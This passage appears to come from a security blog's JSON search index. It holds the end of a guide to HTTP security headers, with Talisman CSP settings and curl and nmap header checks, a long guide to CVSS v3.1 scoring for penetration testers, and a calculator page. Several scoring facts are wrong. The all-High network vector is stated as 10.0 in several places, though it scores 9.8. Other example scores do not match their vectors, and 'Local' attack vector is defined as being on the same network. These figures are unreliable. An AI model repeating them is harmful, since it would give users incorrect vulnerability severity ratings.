[\u0026#34;\u0026#39;self\u0026#39;\u0026#34;], \u0026#39;connect-src\u0026#39;: [\u0026#34;\u0026#39;self\u0026#39;\u0026#34;], \u0026#39;frame-ancestors\u0026#39;: [\u0026#34;\u0026#39;none\u0026#39;\u0026#34;] } Talisman(app, content_security_policy=csp, force_https=True, strict_transport_security=True, strict_transport_security_max_age=31536000, strict_transport_security_include_subdomains=True, strict_transport_security_preload=True) Testing and Validation Manual Testing: We can easily test what headers are in place and their values by using curl.\n# Test all security headers curl -I https://example.com # Test specific headers curl -I https://example.com | grep -E \u0026#34;(Strict-Transport-Security|Content-Security-Policy|X-Frame-Options|X-Content-Type-Options)\u0026#34; # Test with different user agents curl -I -H \u0026#34;User-Agent: Mozilla/5.0\u0026#34; https://example.com Automated Testing Tools: Free Online Security Header Validation Tools: You can interact with them graphically or make calls via curl\nSecurity Headers: https://securityheaders.com Mozilla Observatory: https://observatory.mozilla.org # Using securityheaders.com API curl -X GET \u0026#34;https://securityheaders.com/?q=example.com\u0026amp;hide=on\u0026amp;followRedirects=on\u0026#34; # Using Mozilla Observatory curl -X GET \u0026#34;https://developer.mozilla.org/en-US/observatory/analyze?host=example.com\u0026#34; This can easily be scripted as-well if several sites need to be checked.\n# List of domains urls=(\u0026#34;example.com\u0026#34; \u0026#34;mozilla.org\u0026#34; \u0026#34;wikipedia.org\u0026#34;) # Loop through each URL for url in \u0026#34;${urls[@]}\u0026#34;; do echo \u0026#34;Analyzing $url\u0026#34; curl -s -X GET \u0026#34;https://developer.mozilla.org/en-US/observatory/analyze?host=$url\u0026#34; #curl -s -X GET \u0026#34;https://securityheaders.com/?q=$url\u0026amp;hide=on\u0026amp;followRedirects=on\u0026#34; echo -e \u0026#34;\\n\u0026#34; done Automated Tools: Burp Suite, Nessus \u0026amp; Nikto all provide security header checking.\nNmap Scripts: Good ol\u0026rsquo; nmap provides a nice script that allows us to easily check security headers.\n# Comprehensive security header scan nmap --script http-security-headers -p 443 example.com # Specific header enumeration nmap --script http-headers -p 443 example.com Security Headers Best Practices: This section outlines a practical approach to deploying, monitoring, and maintaining security headers in real-world environments.\nImplementation Strategy: Start with Core Security Headers Begin by implementing high-impact, low-risk headers that provide immediate security benefits:\nStrict-Transport-Security (HSTS): Enforce HTTPS to prevent downgrade attacks. X-Frame-Options: Protect against clickjacking. X-Content-Type-Options: Prevent MIME-type sniffing. Introduce CSP in Stages Content-Security-Policy can be complex. Roll it out incrementally:\nStart in report-only mode to identify potential issues without breaking functionality. Monitor reports and refine your policy iteratively. Switch to enforcement mode once confident and stable. Validate and Test Ensure changes don’t introduce regressions:\nTest policies in staging environments before production. Use different browsers and device types for coverage. Watch for false positives or broken features during rollout. Tools and Resources: OWASP Secure Headers Project Tools: GitHub Organization: https://github.com/owasp-secure-headers Reference Documentation OWASP Secure Headers Project MDN Web Docs - HTTP Headers Content Security Policy Level 3 HTTP Strict Transport Security RFC 6797 ",

    "http:\/\/localhost:1313\/articles\/understandingcvssscoring\/": {
        "title": "Common Vulnerability Scoring System (CVSS) - Complete Guide for Security Professionals",
        "tags": ["CVSS","Security","Vulnerability Assessment","Penetration Testing","Security Scoring","Risk Assessment","Cybersecurity","Security Metrics","FIRST","NIST",],
        "content": "Introduction: The Common Vulnerability Scoring System (CVSS) is an industry standard for assessing and communicating the severity of security vulnerabilities. This guide serves as both a comprehensive reference for security professionals and a practical tool for penetration testers.\nWhat is CVSS? CVSS provides a standardized way to score vulnerabilities on a scale of 0.0 to 10.0, where 10.0 represents the most severe vulnerabilities. The system is maintained by the Forum of Incident Response and Security Teams (FIRST) and is widely adopted across the cybersecurity industry.\nAs penetration testers we typically use CVSS scorings to justify our findings and apply an appropriate score to them.\nCVSS Version Information This guide covers CVSS v3.1, the current standard. CVSS v2 is deprecated but may still be encountered in legacy systems \u0026amp; v4 is still not widely adopted as of yet.\nCVSS Score Ranges: CVSS scores will fall into 1 of 5 scoring categories.\nCritical (9.0-10.0): Vulnerabilities that can lead to complete system compromise. High (7.0-8.9): Vulnerabilities that can lead to significant data loss or system access. Medium (4.0-6.9): Vulnerabilities that can lead to limited data loss or system access. Low (0.1-3.9): Vulnerabilities that have minimal impact or are considered informational. None (0.0): No impact CVSS Scoring Tools: There are multiple tools out there that can be used generate CVSS scores, below are just a few examples.\nI have generated one myself which is available below, and also at https://bloodstiller.com/tools/cvss-calculator/ Official Tools:\nNIST Official Calculator: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator FIRST CVSS Calculator: https://www.first.org/cvss/calculator/3.1 Third-Party Tools:\nVisual JS Calculator: (recommended by Tiberius): https://cvss.js.org/ Qualys CVSS Calculator: https://www.qualys.com/research/security-advisories/cvss/ This is more of a suite of tools that can be used and incurrs a charge. Quick Reference Cheat Sheet: Base Score Metrics Quick Reference: Sometimes when scoring the different metrics can overwhelming so here is a simple quick reference.\nMetric Values Description Attack Vector Network, Adjacent, Local, Physical Where the attacker needs to be Attack Complexity Low, High How difficult the attack is to execute Privileges Required None, Low, High What access the attacker needs User Interaction None, Required Whether user action is needed Scope Changed, Unchanged Whether other systems are affected Confidentiality None, Low, High Impact on data confidentiality Integrity None, Low, High Impact on data integrity Availability None, Low, High Impact on system availability Metrics Explained: Base Score Metrics: This is the only metric we have to fill out to get a score as penetration testers. The Base Score represents the intrinsic characteristics of a vulnerability that are constant over time and across user environments.\nExploitability Metrics: Attack Vector (AV): This is where in space \u0026amp; relation to the target the attacker needs to be to perform the attack.\nNetwork = Internet, the attacker is on a network.\nExample: SQL injection via web application accessible from the internet Adjacent Network = The attacker is on an adjacent network to the target such as a subnet\nExample: Attack from guest WiFi network against corporate network Local = The attacker is on the same network as the target.\nExample: ARP spoofing on the same LAN Physical = The attackers is physically present at the machine or requires physical access.\nExample: USB drop attack, direct console access Attack Complexity: This is used to gauge the complexity of the attack.\nLow = Easy to execute, can be repeated with consistent success\nExample: Simple SQL injection with predictable results High = Complex, may not work consistently, requires specific conditions\nExample: Race condition that requires precise timing Privileges Required: These are the privileges required before the attack, e.g. what privileges the attacker needs to perform the attack.\nNone = No access needed.\nExample: Anonymous web user Low = Normal user account.\nExample: Authenticated web user High = Admin/root account.\nExample: Administrator or root access +Note+: This can be complex. If the attack is against a webhost with a registration page to create an account, this would not be classed as \u0026ldquo;low\u0026rdquo; but instead \u0026ldquo;none\u0026rdquo; as the attacker had no privileges and then was able to generate privileges to perform the attack.\nUser Interaction: Whether the victim has to be an active participant in the attack.\nNone = No user involvement required\nExample: Server-side vulnerability that doesn\u0026rsquo;t require user action Required = User must be involved\nExample: A user must click a malicious link, opening a file Scope: Does this affect another application other than the one being attacked?\nChanged = Affects more than the targeted application.\nExample: Stored XSS that steals cookies from admin panel on a different system to the one that is being attacked. Unchanged = Only affects the targeted application.\nExample: SQL injection that only affects the vulnerable database +Note+: This sometimes requires educated guesswork when making a score as often as testers we will have no direct insight into if the attack on HOST A effects HOST B.\nImpact Metrics: These represent the CIA triad and score the impact of the vulnerability on them.\nConfidentiality Impact: None = No impact on data confidentiality Example: Denial of service vulnerability Low = Limited impact on data confidentiality Example: Access to some non-sensitive data High = Complete loss of confidentiality Example: Access to all data, including sensitive information Integrity Impact: None = No impact on data integrity Example: Information disclosure vulnerability Low = Limited impact on data integrity Example: Modification of some data High = Complete loss of integrity Example: Complete data corruption or unauthorized modifications Availability Impact: None = No impact on system availability Example: Information disclosure vulnerability Low = Limited impact on system availability Example: Reduced performance or intermittent outages High = Complete loss of availability Example: Complete system crash or denial of service Temporal Score Metrics: These metrics reflect how vulnerability severity changes over time. They can be added later if needed but are not required for basic scoring.\nExploit Code Maturity: This indicates whether exploit code exists for this vulnerability:\nUnproven = No proof that exploit exists Proof of Concept = Proof of concept code exists but not functional Functional = Functional exploit exists (GitHub, etc.) High = Automated exploit exists (Metasploit, automated scripts) Remediation Level: Has the vendor fixed it and in what way:\nOfficial Fix = Official fix released by vendor Temporary Fix = Manual remediation advised, no official fix Workaround = Manual configuration changes required Unavailable = No fix or workaround exists Report Confidence: Not commonly used in penetration testing:\nUnknown = No real proof of existence and impact Reasonable = Evidence exists but not vendor-confirmed Confirmed = Vendor has confirmed the vulnerability exists Environmental Score Metrics: As penetration testers, we typically don\u0026rsquo;t modify Environmental Score Metrics as we don\u0026rsquo;t have complete knowledge of the environment. These are usually adjusted by the organization receiving the assessment.\nThe Environmental metrics mirror the Base Score Metrics, allowing organizations to adjust scores based on their specific environment. For example:\nA tester might score something as \u0026ldquo;Adjacent Network\u0026rdquo; but the organization knows the affected system is segregated on its own subnet A tester might give a high Confidentiality score for SQL injection, but the organization knows the database only contains test data What is a CVSS Vector String? A CVSS vector string is a compact, standardized text representation of all the metrics used to calculate a CVSS score. It looks like this.\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Each part after the version number (CVSS:3.1) defines a specific metric, such as how the vulnerability is accessed (AV:N = network), or how much user interaction is required (UI:N = none).\nThe vector string is \u0026ldquo;formula\u0026rdquo; behind the score, as it records the exact combination of conditions and impacts that led to a given score.\nReversible and Consistent: One of the key features of CVSS vectors is that they are reversible and consistent. This means that if someone plugs the exact same vector into a CVSS calculator, they will always get the same score and severity. This ensures repeatability and transparency when sharing or comparing vulnerability assessments.\nA good way to think about this is like a hashing algorithm. If you take the string \u0026ldquo;hello world\u0026rdquo; and run it through a SHA-256 hash function, you\u0026rsquo;ll always get the same result, and so will everyone else, anywhere in the world. Similarly, a CVSS vector string is a standard representation that, when used, always produces the same score, regardless of who calculates it.\n+Note+: Unlike hashes, CVSS vectors are also readable and can be \u0026ldquo;reversed\u0026rdquo; to see the exact conditions that produced the score.\nMany different vector strings can exist, each describing different combinations of metrics \u0026amp; these will naturally produce different scores and severities.\nFor example, a vulnerability requiring local access and user interaction will score lower than one exploitable remotely with no user interaction, even if they both affect the same system.\nSo while a vector string will always map to one unique score, there are countless valid vectors, each representing different scenarios.\nSome Examples Of CVSS Vector Strings: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Critical (10.0) - Remote code execution CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H High (8.8) - XSS requiring user interaction CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L Medium (5.5) - Local privilege escalation Practical Examples: Example 1: SQL Injection Vulnerability: Scenario: A web application has a SQL injection vulnerability in the login form that allows an attacker to bypass authentication and access the admin panel.\nScoring:\nAttack Vector: Network (accessible via internet) Attack Complexity: Low (standard SQL injection techniques) Privileges Required: None (no authentication needed) User Interaction: None (server-side vulnerability) Scope: Unchanged (only affects this application) Confidentiality: High (access to all data) Integrity: High (can modify data) Availability: None (doesn\u0026rsquo;t affect system availability) CVSS Vector:\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N Score: +9.1 (Critical)+ Example 2: Stored XSS Vulnerability: Scenario: A comment system allows users to post HTML that gets stored and displayed to other users, potentially stealing their session cookies.\nScoring:\nAttack Vector: Network (accessible via internet) Attack Complexity: Low (standard XSS techniques) Privileges Required: Low (authenticated user account) User Interaction: Required (victim must view the page) Scope: Changed (affects other users\u0026rsquo; sessions) Confidentiality: High (session hijacking) Integrity: None (no data modification) Availability: None (no system impact) CVSS Vector:\nCVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N Score: 7.4 (+High+) Common Pitfalls \u0026amp; How to Avoid Them: 1. Confusing Attack Vector with Attack Complexity: Mistake: Thinking a complex attack means it\u0026rsquo;s \u0026ldquo;Local\u0026rdquo; or \u0026ldquo;Physical\u0026rdquo; Reality: Attack Vector is about location, Attack Complexity is about difficulty 2. Over-scoring Privileges Required: Mistake: Rating as \u0026ldquo;Low\u0026rdquo; when attacker can create account. Reality: If no initial access is needed, it\u0026rsquo;s \u0026ldquo;None\u0026rdquo;. If anyone can sign up for an account it\u0026rsquo;s classed as \u0026ldquo;None\u0026rdquo; 3. Misunderstanding Scope: Mistake: Always marking as \u0026ldquo;Changed\u0026rdquo; for web applications. Reality: Only \u0026ldquo;Changed\u0026rdquo; if it affects systems beyond the target. 4. Inconsistent Impact Scoring: Mistake: Marking all impacts as \u0026ldquo;High\u0026rdquo; for critical vulnerabilities. Reality: Each CIA component should be scored independently. 5. Ignoring User Interaction: Mistake: Forgetting to consider if user action is required. Reality: This significantly affects the final score. Step-by-Step Walkthrough Walkthrough: Scoring a Buffer Overflow Vulnerability Let\u0026rsquo;s score a buffer overflow vulnerability in a network service:\nAttack Vector: Network (accessible over network) Attack Complexity: Low (standard buffer overflow techniques) Privileges Required: None (no authentication needed) User Interaction: None (no user action required) Scope: Unchanged (only affects this service) Confidentiality: High (can read arbitrary memory) Integrity: High (can modify arbitrary memory) Availability: High (can crash the service) Result:\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Score: +10.0 (Critical)+ Walkthrough: Scoring a Local Privilege Escalation Let\u0026rsquo;s score a local privilege escalation vulnerability:\nAttack Vector: Local (requires local access) Attack Complexity: Low (simple exploit) Privileges Required: Low (normal user account) User Interaction: None (no additional user action) Scope: Unchanged (only affects this system) Confidentiality: High (access to all data) Integrity: High (can modify any data) Availability: High (can control the system) Result:\nCVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H Score: 7.8 (High) Troubleshooting External Resources Official Documentation: FIRST CVSS v3.1 Specification: https://www.first.org/cvss/specification-document NIST National Vulnerability Database: https://nvd.nist.gov/ CVSS v3.1 User Guide: https://www.first.org/cvss/user-guide Learning Resources: OWASP Risk Rating Methodology: https://owasp.org/www-community/OWASP_Risk_Rating_Methodology MITRE CVE Database: https://cve.org/ Tib3rius has released a great video on CVSS scoring:\nTools and Calculators NIST CVSS Calculator: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator FIRST CVSS Calculator: https://www.first.org/cvss/calculator/3.1 Visual CVSS Calculator: https://cvss.js.org/ My CVSS Calculator: https://bloodstiller.com/tools/cvss-calculator/ ", 
        "url": "http:\/\/localhost:1313\/articles\/understandingcvssscoring\/"
    },

        "tags": ["CVSS","Security","Vulnerability Assessment","Penetration Testing","Security Scoring","Risk Assessment","Cybersecurity","Security Metrics","FIRST","NIST","Tools",],
        "content": "Simple CVSS v3.1 Base Score Calculator The Common Vulnerability Scoring System (CVSS) is an industry standard for assessing the severity of security vulnerabilities. This interactive calculator helps security professionals, penetration testers, and researchers quickly calculate CVSS v3.1 base scores and generate proper vector strings.\nWhy make this? I wanted something that was easy to use and always with me. This generator is a simple flat html file, which means even without internet access I can run it locally in my browser and generate scores if need be.\nLimitations\nThis calculator only covers Base Metrics (not Temporal or Environmental, however you only need Base Metrics to caclulate a score) so it is targeted at pentesters. CVSS scores are not a substitute for professional judgment, you need to always consider organizational context and business impact Understanding CVSS v3.1 I would recommend you read my article here https://bloodstiller.com/articles/understandingcvssscoring as I explain the scoring system in depth.\nCVSS v3.1 consists of three metric groups:\nBase Metrics - Intrinsic characteristics of a vulnerability Temporal Metrics - Characteristics that change over time Environmental Metrics - Characteristics specific to an organization\u0026rsquo;s environment This calculator focuses on the Base Metrics, primarily as these are the only required metrics required to generate a CVSS score.\nBase Score Metrics Quick Reference: Sometimes when scoring the different metrics can overwhelming so here is a simple quick reference.\nMetric Values Description Attack Vector Network, Adjacent, Local, Physical Where the attacker needs to be Attack Complexity Low, High How difficult the attack is to execute Privileges Required None, Low, High What access the attacker needs User Interaction None, Required Whether user action is needed Scope Changed, Unchanged Whether other systems are affected Confidentiality None, Low, High Impact on data confidentiality Integrity None, Low, High Impact on data integrity Availability None, Low, High Impact on system availability Severity Ratings CVSS scores are categorized into severity levels:\n0.0: None 0.1 - 3.9: Low 4.0 - 6.9: Medium 7.0 - 8.9: High 9.0 - 10.0: Critical CVSS Vector String The calculator generates a CVSS vector string in the format:\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H This standardized format allows for easy sharing and comparison of vulnerability assessments across different tools and platforms.\nUsage Examples Example 1: Remote Code Execution Vulnerability Attack Vector: Network Attack Complexity: Low Privileges Required: None User Interaction: None Scope: Unchanged Confidentiality: High Integrity: High Availability: High Result: Score 10.0 (Critical)\nExample 2: Information Disclosure Vulnerability Attack Vector: Network Attack Complexity: Low Privileges Required: None User Interaction: None Scope: Unchanged Confidentiality: High Integrity: None Availability: None Result: Score 7.5 (High)\nAdditional Resources Official CVSS v3.1 Specification CVSS Calculator (FIRST) NIST National Vulnerability Database Bloodstiller\n",
